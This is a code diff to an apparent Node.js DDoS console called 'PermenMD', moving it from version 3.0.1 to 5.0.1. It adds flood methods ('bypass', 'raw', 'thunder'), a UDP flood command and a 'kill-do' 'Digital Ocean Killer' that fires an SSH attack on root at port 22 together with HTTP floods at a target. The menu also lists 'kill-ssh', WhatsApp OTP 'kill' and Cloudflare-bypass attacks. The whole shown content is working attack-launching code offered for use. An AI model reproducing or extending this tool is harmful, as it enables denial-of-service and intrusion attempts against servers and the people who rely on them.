@@ -6,7 +6,7 @@ const url = require('url')
 const fs = require('fs')
 const axios = require('axios')
 const path = require('path')
-const version = '3.0.1'
+const version = '5.0.1'
 let processList = [];
 
 const permen = readline.createInterface({
@@ -179,9 +179,9 @@ const ipInfo = await response.json();
     }
 };
 
-async function pushOngoing(methods, duration) {
+async function pushOngoing(target, methods, duration) {
   const startTime = Date.now();
-  processList.push({ methods, startTime, duration })
+  processList.push({ target, methods, startTime, duration })
   setTimeout(() => {
     const index = processList.findIndex((p) => p.methods === methods);
     if (index !== -1) {
@@ -191,9 +191,12 @@ async function pushOngoing(methods, duration) {
 }
 
 function ongoingAttack() {
-  console.log("\nCurrent process list:\n");
+  console.log("\nOngoing Attack:\n");
   processList.forEach((process) => {
-    console.log(`  ${process.methods} (started ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago)\n`);
+console.log(`Target: ${process.target}
+Methods: ${process.methods}
+Duration: ${process.duration} Seconds
+Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
   });
 }
 
@@ -233,23 +236,32 @@ AS       : ${result.as}
 }
 const metode = path.join(__dirname, `/lib/cache/${methods}`);
   if (methods === 'flood') {
-  pushOngoing(methods, duration)
+   pushOngoing(target, methods, duration)
    exec(`node ${metode} ${target} ${duration}`)
 	sigma()
   } else if (methods === 'tls') {
-    pushOngoing(methods, duration)
+    pushOngoing(target, methods, duration)
      exec(`node ${metode} ${target} ${duration} 100 10`)
     sigma()
     } else if (methods === 'strike') {
-      pushOngoing(methods, duration)
-       exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full --legit`)
+      pushOngoing(target, methods, duration)
+       exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`)
       sigma()
       } else if (methods === 'kill') {
-        pushOngoing(methods, duration)
+       pushOngoing(target, methods, duration)
         exec(`node ${metode} ${target} ${duration} 100 10`)
         sigma()
-        } else if (methods === 'vps-killer') {
-          console.log(`Not Available Right Now`)
+        } else if (methods === 'bypass') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+          sigma()
+          } else if (methods === 'raw') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration}`)
+          sigma()
+          } else if (methods === 'thunder') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
           sigma()
           } else {
     console.log(`Method ${methods} not recognized.`);
@@ -259,7 +271,7 @@ const metode = path.join(__dirname, `/lib/cache/${methods}`);
 async function killSSH(args) {
   if (args.length < 2) {
     console.log(`Example: kill-ssh <target> <duration>
-kill-ssh 123.456.789.10 120`);
+kill-ssh 123.456.789.10 120 flood`);
     sigma();
 	return
   }
@@ -325,6 +337,73 @@ exec(`node ${metode} +${target} ${duration}`)
 sigma()
 };
 
+async function killDo(args) {
+  if (args.length < 2) {
+    console.log(`Example: kill-do <target> <duration>
+kill-do 123.456.78.910 300`);
+    sigma();
+	return
+  }
+const [target, duration] = args
+try {
+console.clear()
+console.log(`
+██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
+██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
+██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
+██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
+██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
+╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
+                    VPS Killer Has Been Launched
+========================================================================
+Target   : ${target}
+Duration : ${duration}
+Methods  : Digital Ocean Killer
+Creator  : PermenMD`)
+} catch (error) {
+  console.log(`Oops Something Went Wrong`)
+}
+const raw = path.join(__dirname, `/lib/cache/raw`);
+const flood = path.join(__dirname, `/lib/cache/flood`);
+const ssh = path.join(__dirname, `/lib/cache/StarsXSSH`);
+exec(`node ${ssh} ${target} 22 root ${duration}`)
+exec(`node ${flood} https://${target} ${duration}`)
+exec(`node ${raw} http://${target} ${duration}`)
+sigma()
+};
+
+async function udp_flood(args) {
+  if (args.length < 3) {
+    console.log(`Example: udp-raw <target> <port> <duration>
+udp-raw 123.456.78.910 53 300`);
+    sigma();
+	return
+  }
+const [target, port, duration] = args
+try {
+console.clear()
+console.log(`
+██████╗ ███████╗██████╗ ███╗   ███╗███████╗███╗   ██╗███╗   ███╗██████╗
+██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝████╗  ██║████╗ ████║██╔══██╗
+██████╔╝█████╗  ██████╔╝██╔████╔██║█████╗  ██╔██╗ ██║██╔████╔██║██║  ██║
+██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║╚██╔╝██║██║  ██║
+██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗██║ ╚████║██║ ╚═╝ ██║██████╔╝
+╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═════╝
+                    UDP Raw Flood Attack Launched
+========================================================================
+Target   : ${target}
+Duration : ${duration}
+Methods  : UDP Raw
+Creator  : PermenMD`)
+} catch (error) {
+  console.log(`Oops Something Went Wrong`)
+}
+
+const metode = path.join(__dirname, `/lib/cache/udp`);
+exec(`node ${metode} ${target} ${port} ${duration}`)
+sigma()
+};
+
 async function sigma() {
 const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
 const latestNews = await getNews.text();
@@ -352,6 +431,8 @@ permen.question('[\x1b[1m\x1b[32mPermenMD Console\x1b[0m]: \n', (input) => {
 | kill-ssh  | kill VPS Access 
 | kill-otp  | kill WhatsApp OTP Verification
 | attack    | launch ddos attack
+| udp-raw   | launch udp flood attack
+| kill-do   | digital ocean killer
 | ongoing   | show ongoing attack
 | news      | show latest permenmd news
 | credits   | show creator of these tools
@@ -365,6 +446,9 @@ permen.question('[\x1b[1m\x1b[32mPermenMD Console\x1b[0m]: \n', (input) => {
 || tls        || TLS 1.3 
 || strike     || Best DDoS methods
 || kill       || Bypass Cf DDoS methods
+|| raw        || Huge RPS Flexing XD
+|| bypass     || Bypass With High Power
+|| thunder    || Massive Power Methods
 [=========================================]
 `);
     sigma();
@@ -382,6 +466,10 @@ ${creatorCredits}`);
     killSSH(args);
   } else if (command === 'kill-otp') {
     killOTP(args);
+  } else if (command === 'udp-raw') {
+    udp_flood(args);
+  } else if (command === 'kill-do') {
+    killDo(args);
   } else if (command === 'ongoing') {
     ongoingAttack()
     sigma()
